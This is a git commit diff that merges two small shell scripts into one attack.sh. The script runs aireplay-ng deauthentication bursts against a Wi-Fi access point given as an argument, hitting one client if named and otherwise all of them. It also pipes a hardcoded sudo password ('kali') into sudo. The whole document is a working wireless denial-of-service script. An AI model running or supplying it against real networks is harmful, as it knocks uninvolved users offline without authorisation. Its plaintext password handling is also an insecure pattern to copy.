632c43228143805a7ca56ca959ccc3917fea1a73
George <20459298+george-chou@users.noreply.github.com>
2022-04-21 21:23:31 +0800

    format sh & combine attack

--- air/atkall.sh
+++
@@ -1,3 +0,0 @@
-#! /bin/bash
-
-echo 'kali' | sudo -S aireplay-ng -0 2 -a $1 wlan0
--- air/attack.sh
+++ air/attack.sh
@@ -1,3 +1,7 @@
 #! /bin/bash
 
-echo 'kali' | sudo -S aireplay-ng -0 2 -a $1 -c $2 wlan0
+if [[ -n $2 ]]; then
+    echo 'kali' | sudo -S aireplay-ng -0 2 -a $1 -c $2 wlan0
+else
+    echo 'kali' | sudo -S aireplay-ng -0 2 -a $1 wlan0
+fi
